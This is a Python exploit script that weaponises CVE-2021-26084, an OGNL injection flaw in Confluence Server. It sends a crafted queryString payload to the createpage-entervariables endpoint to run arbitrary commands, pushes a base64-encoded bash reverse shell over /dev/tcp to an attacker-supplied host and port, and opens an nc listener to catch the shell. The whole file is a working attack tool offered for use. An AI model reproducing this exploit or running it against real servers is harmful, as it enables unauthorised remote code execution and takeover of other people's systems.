#!/usr/bin/env python3
#  -*- coding: utf-8 -*- ####################################################################################
#▄█▄    ████▄    ▄   ▄████  █       ▄   ▄███▄      ▄   ▄█▄    ▄███▄   █▄▄▄▄ ▄█▄    ▄███▄                    #
#█▀ ▀▄  █   █     █  █▀   ▀ █        █  █▀   ▀      █  █▀ ▀▄  █▀   ▀  █  ▄▀ █▀ ▀▄  █▀   ▀                   #
#█   ▀  █   █ ██   █ █▀▀    █     █   █ ██▄▄    ██   █ █   ▀  ██▄▄    █▀▀▌  █   ▀  ██▄▄                     #
#█▄  ▄▀ ▀████ █ █  █ █      ███▄  █   █ █▄   ▄▀ █ █  █ █▄  ▄▀ █▄   ▄▀ █  █  █▄  ▄▀ █▄   ▄▀                  #
#▀███▀        █  █ █  █         ▀ █▄ ▄█ ▀███▀   █  █ █ ▀███▀  ▀███▀     █   ▀███▀  ▀███▀                    #
# █   ██   ▀           ▀▀▀          █   ██                 ▀                                                #
# confluence_rce .py - nighter@nighter.se [CVE-2021-26084]                                        #
#                                                                                                           #
# DATE                                                                                                      #
# 11/09/2021                                                                                                #
#                                                                                                           #
# DESCRIPTION                                                                                               #
# An OGNL injection vulnerability exists that would allow an authenticated user,                            #
# and in some instances unauthenticated user, to execute arbitrary code on a Confluence Server              #
# or Data Center instance.                                                                                  #
#                                                                                                           #
# Disclaimer: Just weaponized not my research.                                                              #                                                                                                  #
#############################################################################################################

import requests
import time
import sys
import os
import subprocess

from bs4 import BeautifulSoup

from requests.packages import urllib3
urllib3.disable_warnings()

from multiprocessing import Process

def rce_cmd(command):

    session = requests.session()
    global URL
    
    _headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36", 
                    "Connection": "close", 
                    "Content-Type": "application/x-www-form-urlencoded", 
                    "Accept-Encoding": "gzip, deflate"}      
    _data = {"queryString": "aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin = java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022"+command+"\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\u0022cmd.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027"}
    _result = session.post(URL + '/pages/createpage-entervariables.action?SpaceKey=x', headers=_headers, data=_data, verify=False)
    
    
    soup = BeautifulSoup(_result.text, 'html.parser')
    queryStringValue = soup.find('input',attrs = {'name':'queryString', 'type':'hidden'})['value']
    print(queryStringValue)
    

def exploit():

    time.sleep(3)
    print('[+] Exploit')
    
    # Lazy method reverse shell.
    payload = '''echo -n 'bash -i >& /dev/tcp/%s/%s 0>&1'|base64''' % (LHOST, LPORT)    
    res = subprocess.check_output(payload, shell=True, text=True)
    command = '''echo %s|base64 -d|bash''' % res.strip()
    rce_cmd(command)
    

if __name__ == '__main__':

    if len(sys.argv) != 4:
        print ("""
▄█▄    ████▄    ▄   ▄████  █       ▄   ▄███▄      ▄   ▄█▄    ▄███▄   █▄▄▄▄ ▄█▄    ▄███▄   
█▀ ▀▄  █   █     █  █▀   ▀ █        █  █▀   ▀      █  █▀ ▀▄  █▀   ▀  █  ▄▀ █▀ ▀▄  █▀   ▀  
█   ▀  █   █ ██   █ █▀▀    █     █   █ ██▄▄    ██   █ █   ▀  ██▄▄    █▀▀▌  █   ▀  ██▄▄    
█▄  ▄▀ ▀████ █ █  █ █      ███▄  █   █ █▄   ▄▀ █ █  █ █▄  ▄▀ █▄   ▄▀ █  █  █▄  ▄▀ █▄   ▄▀ 
▀███▀        █  █ █  █         ▀ █▄ ▄█ ▀███▀   █  █ █ ▀███▀  ▀███▀     █   ▀███▀  ▀███▀   
             █   ██   ▀           ▀▀▀          █   ██                 ▀                   
[nighter@nighter.se]
    """)
        print("Usage: %s <URL> <LHOST> <LPORT>" % (sys.argv[0]))
        print("EXAMPLE: ./confluence_rce.py 'http://localhost:8090' 10.10.14.24 1337\n")
        sys.exit(0)

    URL = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]

    # Exploit windows
    p = Process(target=exploit)
    p.start()

    print("[+] Netcat = %s" % LPORT)
    os.system('nc -lnvp %s' % LPORT)